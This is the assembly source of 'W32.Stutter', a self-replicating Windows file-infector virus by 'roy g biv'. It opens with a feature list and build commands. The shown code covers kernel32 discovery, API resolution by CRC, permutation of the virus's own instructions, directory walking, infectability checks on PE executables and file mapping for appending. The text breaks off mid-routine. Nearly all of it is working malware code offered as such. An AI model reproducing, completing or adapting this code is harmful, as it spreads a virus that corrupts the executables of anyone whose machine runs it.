comment ;)
W32.Stutter by roy g biv

some of its features:
- parasitic direct action infector of PE exe (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- new kind of EPO using bound import table:
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC/SFP (including under Windows XP)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm

yes, just a W32.Boundary remake with a different poly engine
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 stutter
tlink32 /B:400000 /x stutter,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.486
.model  flat

extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include stutter.inc

only_xp         equ     0 ;set to 1 if running on XP SP2 and later (more options in oligormorphic engine)

dropper         label   near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        inc     edx
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        push    offset stutter_inf + 5
        xor     ecx, ecx
        push    dword ptr fs:[ecx]
        mov     dword ptr fs:[ecx], esp
        mov     esi, offset seh_ret

check_inst      label   near
        mov     al, byte ptr [esi]
        push    instsize + 2
        pop     edx
        cmp     al, 0e8h
        je      count_inst
        sub     al, 70h
        cmp     al, 10h
        jb      count_inst
        cdq
        _cmpinst
        je      skip_inst

count_inst      label   near
        call    get_opsize
        add     esi, eax
        _cmpinst
        jne     count_inst

skip_inst       label   near
        inc     ecx
        lea     esi, dword ptr [esi + edx + instsize + 2]
        cmp     esi, offset stutter_codeend
        jne     check_inst
        mov     dword ptr [offset patch_count + 1], ecx
        imul    eax, ecx, size instlist
        mov     dword ptr [offset patch_base + 2], eax
        add     eax, offset stutter_codeend - offset stutter_inf
        mov     dword ptr [offset patch_alloc + 1], eax
        shl     ecx, 2
        mov     eax, ecx
        sub     eax, 4
        mov     dword ptr [offset patch_size1 + 2], eax
        mov     dword ptr [offset patch_vat1 + 2], ecx
        mov     dword ptr [offset patch_cmpsize + 1], ecx
        mov     dword ptr [offset patch_size2 + 3], ecx
        mov     dword ptr [offset patch_size3 + 3], eax
        mov     dword ptr [offset patch_vafvat + 2], ecx
        imul    eax, ecx, 3
        sub     eax, 4
        mov     dword ptr [offset patch_vat2 + 3], eax
        push    ecx
        dec     ecx
        dec     ecx
        add     ecx, ecx
        mov     dword ptr [offset patch_vaf1 + 2], ecx
        mov     dword ptr [offset patch_vaf2 + 3], ecx
        add     ecx, ecx
        add     ecx, 8
        mov     dword ptr [offset patch_newva1 + 3], ecx
        mov     dword ptr [offset patch_newva2 + 3], ecx
        sub     ecx, 4
        mov     dword ptr [offset patch_newva3 + 3], ecx
        mov     dword ptr [offset patch_newva4 + 2], ecx
        mov     dword ptr [offset patch_newva5 + 2], ecx
        mov     ebx, esp
        fld1
        fild    dword ptr [ebx]
        fyl2x
        fistp   dword ptr [ebx]
        pop     ecx
        inc     ecx
        push    1
        pop     eax
        shl     eax, cl
        sub     eax, 4
        mov     dword ptr [offset patch_andsize + 1], eax
        mov     eax, dword ptr [offset ExitProcess + 2]
        mov     eax, dword ptr [eax]
        mov     dword ptr [offset stutter_exit + 1], eax
        mov     dword ptr [offset exit_process + 1], eax
        mov     edi, dword ptr [esp + 8]

find_kernel     label   near
        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_kernel
        mov     dword ptr [offset host_patch + 1], edi
        xor     eax, eax
        push    eax
        push    offset txttitle
        push    offset txtbody
        push    eax
        call    MessageBoxA

stutter_inf     label   near
        call    stutter_seh

        ;available for eax/ecx/edx regswap
        ;ebx/esi/edi not available in 9x/NT/2000 unless saved first
        ;ebp not available anywhere unless saved first

        pop     ecx
        pop     edx
        push    ecx
        cmp     byte ptr [edx + ExceptionCode], exception and 0ffh
        jne     seh_cont
        mov     ecx, dword ptr [edx + ExceptionAddress]
if __int3 - 0cch
        movsx   eax, word ptr [ecx + instsize]
        lea     ecx, dword ptr [ecx + eax + instsize + 2]
else
        inc     ecx
        movsx   eax, word ptr [ecx]
        lea     ecx, dword ptr [ecx + eax + instsize + 1]
endif

        ;available for constant shift

        add     edx, 7fh
        mov     dword ptr [edx + ContextEip - 7fh], ecx

        xor     eax, eax

seh_ret         label   near
        ret
seh_cont        label   near
        _int3   unmap_seh                       ;separation begins after this instruction

stutter_seh     label   near
        xor     eax, eax
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        _int3z
        enter   ((size findlist - 5) and -4) + ((statelen + 1) shl 2), 0
                                                ;Windows NT/2000/XP enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
                                                ;statelen for RNG cache
        _int3z
        push    eax                             ;zero findprev in findlist
        _int3z

host_patch      label   near
        mov     edi, "!bgr"                     ;replaced by kernel32 image base
        _int3z
        _call   find_mzhdr
krncrcbegin     label   near
        db      (krncrc_count * size apistruc) dup (0)
;        db      "Stutter - roy g biv"           ;you're i-i-infected

        push    "so"
        _int3z
        push    "_cfs"                          ;Windows XP (forwarder chain from sfc.dll)
        _int3z
        push    esp
        _int3z
        call    dword ptr [esp + 8 + krncrcstk.kLoadLibraryA]
        _int3z
        test    eax, eax
        _int3z
        _jne    found_sfc
        mov     byte ptr [esp + 3], al          ;Windows Me/2000
        _int3z
        push    esp
        _int3z
        call    dword ptr [esp + 8 + krncrcstk.kLoadLibraryA]
        _int3z
        test    eax, eax
        _int3z

found_sfc       label   near
        pop     ecx
        _int3z
        pop     ecx
        _int3z
        _jne    call_sfc
        push    eax
        _int3   swap_create

find_mzhdr      label   near
        _call   is_pehdr
        mov     ebx, edi
        _int3z
        pop     edi
        _int3z
        movsx   eax, word ptr [edi + instsize]
        _int3z
        lea     edi, dword ptr [edi + eax + instsize + 2]
        _int3z

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        _int3z
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        _int3z
        lods    dword ptr [esi]                 ;Export Address Table RVA
        _int3z
        lea     edx, dword ptr [ebx + eax]
        _int3z
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        _int3z
        lea     ecx, dword ptr [ebx + eax]
        _int3z
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        _int3z
        lea     ebp, dword ptr [ebx + eax]
        _int3z
        mov     esi, ecx
        _int3z

push_export     label   near
        push    ecx
        _int3z

get_export      label   near
        lods    dword ptr [esi]
        _int3z
        push    ebx
        _int3z
        add     ebx, eax                        ;Name Pointer VA
        _int3z
        or      eax, -1
        _int3z

crc_outer       label   near
        xor     al, byte ptr [ebx]
        _int3z
        push    8
        _int3z
        pop     ecx
        _int3z

crc_inner       label   near
        add     eax, eax
        _int3z
        _jnb    crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)
        _int3z

crc_skip        label   near
        dec     ecx
        _int3z
        _jne    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        _int3z
        inc     ebx                             ;carry not altered by inc
        _int3z
        _jb     crc_outer
        pop     ebx
        _int3z
        cmp     dword ptr [edi + 1], eax
        _int3z
        _jne    get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        _int3z
        mov     eax, esi
        _int3z
        sub     eax, ecx                        ;Name Pointer Table VA
        _int3z
        shr     eax, 1
        _int3z
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        _int3z
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        _int3z
        add     eax, ebx
        _int3z
        push    eax
        _int3z
        movsx   eax, word ptr [edi + instsize + 5]
        _int3z
        lea     edi, dword ptr [edi + eax + instsize + 7]
        _int3z
        cmp     byte ptr [edi], 0b8h
        _int3z
        _je     push_export
        jmp     edi
        _int3z

call_sfc        label   near
        xchg    edi, eax
        _int3z
        _call   find_mzhdr
sfccrcbegin     label   near
        db      size apistruc dup (0)

swap_create     label   near
        lea     esi, dword ptr [esp + krncrcstk.kCreateFileMappingA]
        _int3z
        mov     edi, esi
        _int3z
        lods    dword ptr [esi]
        _int3z
        movs    dword ptr [edi], dword ptr [esi]
        _int3z
        stos    dword ptr [edi]
        _int3z

;-----------------------------------------------------------------------------
;generate only one new permutation, to make it slow
;-----------------------------------------------------------------------------

        call    dword ptr [esi + krncrcstk.kGetTickCount - krncrcstk.kCreateFileA]
        _int3z
        lea     edi, dword ptr [esi + size krncrcstk - krncrcstk.kCreateFileA + ((size findlist + 3) and -4)]
        _int3z
        _call   randinit
        xor     eax, eax
        _int3z
        mov     edi, dword ptr fs:[eax]
        _int3z
        mov     edi, dword ptr [edi + 4]
        _int3z
        sub     edi, 5
        _int3z
        push    PAGE_READWRITE
        _int3z
        push    MEM_COMMIT
        _int3z

patch_alloc     label   near
        push    '!bgr'
        _int3z
        push    eax
        _int3z
        call    dword ptr [esi + krncrcstk.kVirtualAlloc - krncrcstk.kCreateFileA]
        _int3z

patch_count     label   near
        mov     ebx, '!bgr'
        _int3z
        push    ebx
        _int3z
        push    eax
        _int3z
        xchg    edi, eax
        _int3z
        stos    dword ptr [edi]
        _int3z
        mov     cl, offset stutter_seh - offset stutter_inf
        _int3z
        lea     esi, dword ptr [eax + (offset stutter_seh - offset stutter_inf) - (instsize + 2)]
        _int3z
        push    edi
        _int3z
        pushfd
        _int3   patch_size1

parse_inst      label   near
        mov     eax, esi
        _int3z
        stos    dword ptr [edi]
        _int3z
        mov     al, byte ptr [esi]
        _int3z
        sub     al, 0e8h
        _int3z
        cmp     al, 1
        _int3z
        _jb     size_flags
        sub     al, 70h - 0e8h
        _int3z
        cmp     al, 10h
        _int3z

size_flags      label   near
        push    edi
        _int3z
        pushfd
        _int3z
        sbb     cl, cl
        _int3z
        and     cl, instsize + 2
        _int3z
        add     cl, instsize + 2
        _int3z
        _cmpinst
        _int3z
        _je     patch_size1

size_inst       label   near
        _call   get_opsize
        add     cl, al
        _int3z
        add     esi, eax
        _int3z
        _cmpinst
        _int3z
        _jne    size_inst

patch_size1     label   near
        mov     byte ptr [edi + '!bgr'], cl
        _int3z

store_va        label   near
ife __int3 - 0cch
        dec     esi
        _int3z
endif
        lods    dword ptr [esi]
        _int3z
        sar     eax, 10h
        _int3z
        add     eax, esi
        _int3z

patch_vaf1      label   near
        mov     dword ptr [edi + '!bgr'], eax
        _int3z

patch_vat1      label   near
        add     edi, '!bgr'
        _int3z
        popfd
        _int3z
        cmc
        _int3z
        pushfd
        _int3z
        _jnb    store_va
        popfd
        _int3z
        pop     edi
        _int3z
        dec     ebx
        _int3z
        _jne    parse_inst
        xchg    ebx, eax
        _int3z
        pop     esi
        _int3z
        pop     ebx
        _int3z

patch_base      label   near
        lea     edi, dword ptr [esi + '!bgr']
        _int3z
        push    edi
        _int3z
        push    ebx
        _int3   patch_newva2

copy_inst       label   near
        _call    random

patch_andsize   label   near
        and     eax, '!bgr'
        _int3z

patch_cmpsize   label   near
        cmp     eax, '!bgr'
        _int3z
        _jnb    copy_inst

patch_newva1    label   near
        cmp     dword ptr [eax + esi + '!bgr'], 0
        _int3z
        _jne    copy_inst

patch_newva2    label   near
        mov     dword ptr [eax + esi + '!bgr'], edi
        _int3z

patch_size2     label   near
        mov     ecx, dword ptr [eax + esi + '!bgr']
        _int3z
        mov     eax, dword ptr [esi + eax]
        _int3z
        xchg    esi, eax
        _int3z
        rep     movs byte ptr [edi], byte ptr [esi]
        _int3z
        xchg    esi, eax
        _int3z
        dec     ebx
        _int3z
        _jne    copy_inst
        pop     ecx
        _int3z
        mov     ebp, ecx
        _int3z

reloc_inst      label   near

patch_vat2      label   near
        cmp     dword ptr [ebp * 4 + esi + '!bgr'], ebx
        _int3z
        stc
        _int3z
        mov     edx, esi
        _int3z

reloc_flags     label   near
        pushfd
        _int3z

patch_vaf2      label   near
        mov     eax, dword ptr [ebp * 4 + edx + '!bgr']
        _int3z

patch_newva3    label   near
        mov     edx, dword ptr [ebp * 4 + esi + '!bgr']
        _int3z

patch_size3     label   near
        add     edx, dword ptr [ebp * 4 + esi + '!bgr']
        _int3z
        popfd
        _int3z
        pushfd
        _int3z
        _je     find_oldva
        _jnb    find_oldva
        sub     edx, instsize + 2
        _int3z

find_oldva      label   near
        mov     edi, esi
        _int3z
        push    ecx
        _int3z
        repne   scas dword ptr [edi]
        _int3z
        pop     ecx
        _int3z

patch_newva4    label   near
        mov     eax, dword ptr [edi + '!bgr']
        _int3z
        sub     eax, edx
        _int3z
        mov     word ptr [edx - 2], ax
        _int3z

patch_vafvat    label   near
        lea     edx, dword ptr [esi + '!bgr']
        _int3z
        popfd
        _int3z
        cmc
        _int3z
        _jnbe   reloc_flags
        dec     ebp
        _int3z
        _jne    reloc_inst
        lods    dword ptr [esi]
        _int3z
        xchg    esi, eax
        _int3z
        xchg    edi, eax
        _int3z
        inc     esi
        _int3z
        lods    dword ptr [esi]
        _int3z
        add     eax, esi
        _int3z
        repne   scas dword ptr [edi]
        _int3z

patch_newva5    label   near
        mov     eax, dword ptr [edi + '!bgr']
        _int3z
        pop     esi
        _int3z
        push    esi
        _int3z
        sub     eax, esi
        _int3z
        sub     eax, 5
        _int3z
        mov     dword ptr [esi + 1], eax
        _int3z

;-----------------------------------------------------------------------------
;morph the big constant section
;-----------------------------------------------------------------------------

        _call   randreg
        xchg    ecx, eax
        _int3z

rand_reg2       label   near
        _call   randreg
        cmp     al, cl
        _int3z
        _je     rand_reg2
        xchg    edx, eax
        _int3z

rand_reg3       label   near
        _call   randreg
        cmp     al, dl
        _int3z
        _je     rand_reg3
        xchg    ebx, eax
        _int3z

rand_reg4       label   near
        _call   randreg
        cmp     al, dl
        _int3z
        _je     rand_reg4
        cmp     al, bl
        _int3z
        _je     rand_reg4
        xchg    ebp, eax
        _int3z
        mov     eax, ecx
        _int3z
        shl     eax, 10h
        _int3z
        mov     ah, dl
        _int3z
        mov     al, cl
        _int3z
        add     eax, 80505858h
        _int3z
        mov     dword ptr [esi + 5], eax
        _int3z
        sub     ah, 20h
        _int3z
        mov     byte ptr [esi + 9], ah
        _int3z
        lea     eax, dword ptr [ebx * 8 + edx + 40h]
        _int3z
        mov     byte ptr [esi + 0eh], al
        _int3z
if __int3 - 0cch
        lea     eax, dword ptr [ebp * 8 + ebx + 40h]
        _int3z
        mov     byte ptr [esi + 12h], al
else
        lea     eax, dword ptr [ebx + 40h]
        _int3z
        mov     byte ptr [esi + 10h], al
        _int3z
        lea     eax, dword ptr [ebp * 8 + ebx]
        _int3z
        mov     byte ptr [esi + 13h], al
endif
        _int3z
        pushad
        _int3z
        _call   randreg
        and     al, 1
        _int3z
        imul    ecx, dword ptr [eax * 8 + esp + 8], 8
        _int3z
        xor     al, 1
        _int3z
        add     ecx, dword ptr [eax * 8 + esp + 8]
        _int3z

rand_reg134     label   near
        _call   randreg
if only_xp
        and     al, 3
        _int3z
        _je     rand_reg134
        imul    eax, dword ptr [eax * 8 + esp], 8
else
        imul    eax, dword ptr [eax * 8 + esp + 8], 8
endif
        _int3z
        add     al, 44h
        _int3z
        mov     ah, cl
        _int3z
        mov     word ptr [esi + 15h], ax
        _int3z
        lea     ecx, dword ptr [eax + edx - 4]
        _int3z
        mov     ch, 89h
        _int3z
        bswap   ecx
        _int3z
        mov     cl, 0c0h
        _int3z
        add     cl, dl
        _int3z

rand_off        label   near
        _call   random
        and     al, 7fh
        _int3z
        cmp     al, ContextEip - 7fh
        _int3z
        _jb     rand_off
        mov     ch, al
        _int3z
        mov     dword ptr [esi + 19h], ecx
        _int3z
        mov     al, ContextEip and 0ffh
        _int3z
        sub     al, ch
        _int3z
        mov     byte ptr [esi + 1dh], al
        _int3z
        popad
        _int3z

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;so for Windows NT/2000/XP this code handles files that no ANSI function can open
;-----------------------------------------------------------------------------

        lea     ebx, dword ptr [esp + 4]
        _int3z
        call    dword ptr [ebx + krncrcstk.kGetVersion]
        _int3z
        shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
        _int3z                                  ;safer than using AreFileApisANSI()
        lea     ebp, dword ptr [eax * 4 + ebx]
        _int3z
        lea     esi, dword ptr [ebx + size krncrcstk]
        _int3z

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;ANSI-compatible Unicode findmask
        _int3z
        mov     eax, esp
        _int3z
        lea     ebx, dword ptr [esi + findlist.finddata]
        _int3z
        push    ebx
        _int3z
        push    eax
        _int3z
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        _int3z
        pop     ecx
        _int3z
        mov     dword ptr [esi + findlist.findhand], eax
        _int3z
        inc     eax
        _int3z
        _je     find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        _int3z
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        _int3z
        test    al, FILE_ATTRIBUTE_DIRECTORY
        _int3z
        _je     test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        _int3z
        _je     find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        _int3z
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        _int3z
        test    eax, eax
        _int3z
        _je     find_next
        push    size findlist
        _int3z
        push    GMEM_FIXED
        _int3z
        call    dword ptr [esp + 4 + krncrcstk.kGlobalAlloc + 8]
        _int3z
        test    eax, eax
        _int3z
        _je     step_updir
        xchg    esi, eax
        _int3z
        mov     dword ptr [esi + findlist.findprev], eax
        _int3   scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        _int3z
        push    ebx
        _int3z
        mov     edi, dword ptr [esi + findlist.findhand]
        _int3z
        push    edi
        _int3z
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        _int3z
        test    eax, eax
        _int3z
        _jne    test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        _int3z
        push    edi
        _int3z
        call    dword ptr [ebx + 4 + krncrcstk.kFindClose]
        _int3z

find_prev       label   near
        mov     eax, dword ptr [esi + findlist.findprev]
        _int3z
        test    eax, eax
        _int3z
        _je     stutter_exit                    ;game over
        push    esi
        _int3z
        xchg    esi, eax
        _int3z
        call    dword ptr [ebx + 4 + krncrcstk.kGlobalFree]
        _int3z

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        _int3z
        push    esp
        _int3z
        call    dword ptr [ebx + 4 + krncrcstk.kSetCurrentDirectoryA]
        _int3z
        pop     eax
        _int3   find_next

stutter_exit    label   near
        push    "!bgr"                          ;replaced by ExitProcess
        _int3   pehdr_ret

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        _int3z
        mov     eax, ebp
        _int3z
        enter   MAX_PATH * 2, 0
        _int3z
        mov     ecx, esp
        _int3z
        push    eax
        _int3z
        push    esp
        _int3z
        push    ecx
        _int3z
        push    MAX_PATH
        _int3z
        push    edi
        _int3z
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        _int3z
        xchg    edi, eax
        _int3z
        pop     eax
        _int3z
        xor     ebx, ebx
        _int3z
        call    dword ptr [ebp + 0ch + krncrcstk.kGetVersion]
        _int3z
        test    eax, eax
        _int3z
        _jns    call_sfcapi
        mov     ecx, esp
        _int3z
        xchg    ebp, eax
        _int3z
        enter   MAX_PATH * 2, 0
        _int3z
        xchg    ebp, eax
        _int3z
        mov     eax, esp
        _int3z
        push    MAX_PATH
        _int3z
        push    eax
        _int3z
        inc     edi
        _int3z
        push    edi
        _int3z
        push    ecx
        _int3z
        push    ebx                             ;use default translation
        _int3z
        push    ebx                             ;CP_ANSI
        _int3z
        call    dword ptr [ebp + 0ch + krncrcstk.kMultiByteToWideChar]
        _int3z

call_sfcapi     label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [ebp + 0ch + krncrcstk.kSfcIsFileProtected]
        _int3z
        test    eax, eax                        ;fake success in case of no SFC
        _int3z
        _je     leave_sfc
        push    esp
        _int3z
        push    ebx
        _int3z
        call    eax
        _int3z

leave_sfc       label   near
        leave
        _int3z
        test    eax, eax
        _int3z
        _jne    restore_attr
        _call   set_fileattr
        push    ebx
        _int3z
        push    ebx
        _int3z
        push    OPEN_EXISTING
        _int3z
        push    ebx
        _int3z
        push    ebx
        _int3z
        push    GENERIC_READ or GENERIC_WRITE
        _int3z
        push    edi
        _int3z
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        _int3z
        xchg    ebx, eax
        _int3z
        _call   test_infect
        _jne    set_time
        _call   infect_file                     ;Super Nashwan power ;)

set_time        label   near
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        _int3z
        push    eax
        _int3z
        sub     eax, 8
        _int3z
        push    eax
        _int3z
        push    0
        _int3z
        push    ebx
        _int3z
        call    dword ptr [esp + 8 + krncrcstk.kSetFileTime + 10h]
        _int3z
        push    ebx
        _int3z
        call    dword ptr [esp + 8 + krncrcstk.kCloseHandle + 4]
        _int3z

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        _int3z
        call    cset_fileattr
        _int3   find_next
cset_fileattr   label   near
        _int3   set_fileattr
scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        _int3z
        _jne    pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        _int3z
        add     esi, edi
        _int3z
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        _int3z
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX
        _int3   pehdr_ret                       ;if PE file, then eax = 0, esi -> COFF header, Z flag set

pehdr_ret       label   near
        ret     ;earlier ret is not visible as separate instruction
        _int3z
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        _int3z
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        _int3z
        push    edi
        _int3z
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        _int3   pehdr_ret                       ;edi -> filename
;       db      "21/01/07"
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;ebx = file handle, esi = findlist, ebp -> platform APIs
        _call   map_view
        mov     ebp, esi
        _int3z
        _call   is_pehdr
        _jne    inftest_ret
        lods    dword ptr [esi]
        _int3z
        cmp     ax, IMAGE_FILE_MACHINE_I386
        _int3z
        _jne    inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        _int3z
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        _int3z
        mov     eax, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]
        _int3z

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;no .dll files this time
;-----------------------------------------------------------------------------

        test    ah, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        _int3z
        _jne    inftest_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        _int3z
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        _int3z
        _jne    inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        add     esi, pehdr.pesubsys - pehdr.pecoff.petimedate
        _int3z
        lods    dword ptr [esi]
        _int3z
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        _int3z
        _jnbe   inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        _int3z
        _jb     inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        _int3z
        _jb     inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pestackmax], eax
        _int3z
        _jnbe   inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pestackmax]
        _int3z
        add     eax, edx
        _int3z
        push    esi
        _int3z
        lea     esi, dword ptr [esi + eax - pehdr.pestackmax + pehdr.pemagic - size pesect + pesect.sectrawsize]
        _int3z
        lods    dword ptr [esi]
        _int3z
        add     eax, dword ptr [esi]
        _int3z
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        _int3z
        xchg    esi, eax
        _int3z
        pop     esi
        _int3z
        _jne    inftest_ret                     ;file contains appended data
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pestackmax]
        _int3z
        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
        _int3z
        _call   gather_info
        sbb     eax, eax
        _int3z
        inc     eax
        _int3z
        mov     dword ptr [esp + mapsehstk.mapsehsehret], eax
        _int3z

inftest_ret     label   near
        db      0ffh, 0ffh                      ;must be unique exception class
        _int3z

gather_info     proc    near
        mov     ecx, dword ptr [esi + pehdr.pebound.dirrva - pehdr.pestackmax]
        _int3z
        test    ecx, ecx
        _int3z
        _je     pehdr_ret
        xchg    esi, eax
        _int3z
        xchg    ebp, eax
        _int3z
        add     ecx, edi                        ;it's really a RVA but it always exists before first section
        _int3z
        mov     edx, ecx
        _int3z

parse_bound     label   near
        movzx   eax, word ptr [edx + pebind.bindrva]
        _int3z
        test    eax, eax
        _int3z
        _je     pehdr_ret
        add     edx, size pebind
        _int3z
        mov     eax, dword ptr [ecx + eax]
        _int3z
        or      eax, "    "
        _int3z
        cmp     eax, "nrek"
        _int3z
        _jne    parse_bound
        mov     ecx, dword ptr [ebp + pehdr.peimport.dirrva - pehdr.pestackmax]
        _int3z
        _call    rva2raw

parse_import    label   near
        push    ecx
        _int3z
        mov     ecx, dword ptr [edi + ecx + peimp.impdllrva]
        _int3z
        _call    rva2raw
        mov     eax, dword ptr [edi + ecx]
        _int3z
        pop     ecx
        _int3z
        add     ecx, size peimp
        _int3z
        or      eax, "    "
        _int3z
        cmp     eax, "nrek"
        _int3z
        _jne    parse_import
        mov     ecx, dword ptr [edi + ecx - size peimp + peimp.impiatrva]
        _int3z
        _call   rva2raw
        xor     eax, eax
        _int3z
        add     edi, ecx
        _int3z
        or      ecx, -1
        _int3z
        push    edi
        _int3z
        repne   scas dword ptr [edi]
        _int3z
        pop     edi
        _int3z

exit_process    label   near
        mov     eax, "!bgr"                     ;replaced by ExitProcess
        _int3z
        not     ecx
        _int3z
        repne   scas dword ptr [edi]
        _int3z
        _jne    pehdr_ret
        stc
        _int3   pehdr_ret
gather_info     endp

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;-----------------------------------------------------------------------------

open_append     proc    near
        _call   random
        and     eax, RANDPADMAX - 1
        _int3z
        add     ax, small (offset stutter_codeend - offset stutter_inf + RANDPADMIN)
        _int3z

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;ebx = file handle, esi -> findlist, ebp -> platform APIs
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        _int3z
        cdq
        _int3z
        push    eax
        _int3z
        mov     ecx, esp
        _int3z
        push    eax                             ;MapViewOfFile
        _int3z
        push    edx                             ;MapViewOfFile
        _int3z
        push    edx                             ;MapViewOfFile
        _int3z
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        _int3z
        push    edx
        _int3z
        push    eax
        _int3z
        push    edx
        _int3z
        push    PAGE_READWRITE
        _int3z
        push    edx
        _int3z
        push    ebx
        _int3z
